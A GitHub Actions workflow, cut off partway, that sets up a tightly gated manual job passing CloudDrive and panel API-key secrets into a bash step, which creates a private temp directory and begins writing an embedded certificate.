name: One-shot bounded read-only CloudDrive hash verification
on:
  workflow_dispatch:
permissions: {}
jobs:
  verify:
    if: github.repository == 'zhumiao-cloud/ddiittumap' && github.actor == 'zhumiao-cloud' && github.triggering_actor == 'zhumiao-cloud' && github.ref == 'refs/heads/main' && github.run_number == 1 && github.run_attempt == 1
    runs-on: ubuntu-latest
    timeout-minutes: 13
    steps:
      - name: Encrypted bounded diagnostics
        env:
          CD_API_KEY: ${{ secrets.CD_API_KEY }}
          PANEL_API_KEY: ${{ secrets.PANEL_API_KEY }}
        shell: bash
        run: |
          set -euo pipefail
          set +x
          umask 077
          d=$(mktemp -d)
          trap 'rm -rf "$d"' EXIT
          cat > "$d/cert.pem" <<'CERT'
          -----BEGIN CERTIFICATE-----
